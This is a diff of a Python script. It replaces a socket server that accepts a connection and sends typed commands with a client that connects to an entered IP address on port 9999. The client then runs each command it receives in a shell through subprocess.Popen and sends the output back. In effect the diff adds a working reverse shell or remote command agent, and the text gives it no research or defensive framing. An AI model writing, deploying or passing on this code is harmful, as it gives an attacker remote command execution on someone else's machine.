@@ -1,89 +1,60 @@
 import socket
-import sys
+import os
+import subprocess
+import platform
 
 
-def create_socket():
+def information_():
+    global host
+    global port
+    global skt
+    host = input("Enter IP address: ")
+    #host = "192.168.0.101"
+    port = 9999
+    skt = socket.socket()
+
+
+def connect_server():
     try:
         global host
         global port
         global skt
-        host =""
-        port =9999
-        skt = socket.socket()
+        print("\nConnecting to " + str(host) + " .....")
+        skt.connect((host, port))
+        print("\nConnection established....\n")
+        return True
     except socket.error as msg:
-        print("Socket Creation Error: "+ str(msg)+"\n")
+        print("Socket connection error: " + str(msg) + "\n.. Check the server connection...\n")
 
 
-def bind_sockets():
-    try:
-        global host
-        global port
-        global skt
 
-        print("Binding the port: "+ str(port) +" .....\n")
-        skt.bind((host, port))
-        skt.listen(5)
-
-    except socket.error as msg:
-        print("Socket binding error: "+ str(msg)+"\nRetrying...")
-        bind_sockets()
-
-
-def socket_accept():
-    conn, address = skt.accept()
-    print("Connection established | Ip: " + address[0] + " port: " + str(address[1]))
-
-    #here goes all commands
-    os_version = os_checker(conn)
-    print("OS version: "+ os_version + "\n")
-    send_commands(conn)
-    conn.close()
-
-
-def path_finder(conn):
-    cmd = "pwd"
-    conn.send(str.encode(cmd))
-    client_response = str(conn.recv(1048576), "utf-8")
-    out_path = client_response[2:-1].rstrip('\\n')
-    return out_path
-
-
-def os_checker(conn):
-    cmd = "platform"
-    conn.send(str.encode(cmd))
-    client_response = str(conn.recv(1048576), "utf-8")
-    out_os = client_response.rstrip('\\n')
-    return out_os
-
-
-def send_commands(conn):
-
+def data_receiving():
+    global host
+    global port
+    global skt
     while True:
-        cmd = input(path_finder(conn)+">>")
-        if cmd == "quit":
-            conn.close()
-            skt.close()
-            sys.exit()
-        if len(str.encode(cmd))>0:
-            conn.send(str.encode(cmd))
-            client_response = str(conn.recv(1048576), "utf-8")
-            #print(client_response, end="")
-            pattern_remover(client_response)
+        data = skt.recv(1048576)
+        if data[:2].decode("utf-8") == "cd":
+            os.chdir(data[3:].decode("utf-8"))
+        if data[:8].decode("utf-8") == "platform":
+            out_str = platform.platform()
+            skt.send(str.encode(out_str))
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_string = str(output_byte)
 
+            currentWD = os.getcwd() + " >> "
 
-def pattern_remover(client_response):
-    output_data = client_response[2:-1].replace('\\n', "^")
-    for ch in output_data:
-        if ch == '^':
-            print("")
-        else:
-            print(ch, end="")
+            skt.send(str.encode(output_string))
 
 
 def main():
-    create_socket()
-    bind_sockets()
-    socket_accept()
-
+    information_()
+    connn = False
+    connn = connect_server()
+    if connn:
+        data_receiving()
 
 main()
